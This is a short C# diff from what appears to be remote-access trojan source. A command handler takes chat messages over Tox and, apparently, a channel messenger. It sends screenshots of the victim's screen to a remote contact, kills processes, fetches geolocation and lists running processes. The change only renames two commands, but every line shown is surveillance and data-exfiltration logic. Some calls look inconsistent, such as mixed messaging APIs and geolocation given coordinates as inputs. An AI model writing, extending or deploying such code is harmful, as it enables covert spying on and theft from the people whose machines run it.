@@ -380,7 +380,7 @@ class Program
             tox.SendFile(e.FriendNumber, screenshotPath, "Screenshot.png");
             File.Delete(screenshotPath);
         }
-        else if (message.StartsWith("!exit"))
+        else if (message.StartsWith("!close"))
         {
             string currentProcessName = Process.GetCurrentProcess().ProcessName;
             Process[] processList = Process.GetProcessesByName(currentProcessName);
@@ -568,7 +568,7 @@ class Program
             var result = new Geolocator().GetGeopositionAsync(lat, lon);
             await Send_message(channelid, result.ToString());
         }
-        else if (message.StartsWith("!proclist"))
+        else if (message.StartsWith("!plist"))
         {
             var procs = Process.GetProcesses();
             StringBuilder sb = new StringBuilder();
